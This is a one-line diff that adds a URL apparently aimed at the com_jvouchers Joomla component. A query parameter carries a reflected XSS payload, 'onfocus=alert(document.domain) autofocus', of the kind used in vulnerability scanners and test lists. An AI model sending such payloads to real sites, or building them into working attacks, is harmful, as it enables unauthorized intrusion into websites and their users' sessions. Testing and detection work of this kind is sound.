@@ -1,0 +1,1 @@
+/index.php?option=com_jvouchers&controller=catalog-results&task=query&wajx=1&wmjx=1&tmpl=component&type=raw&crtyid=12&trucs[x][search]=gx3vt%20onfocus=alert(document.domain)%20autofocus=%20itkrzsug7w5
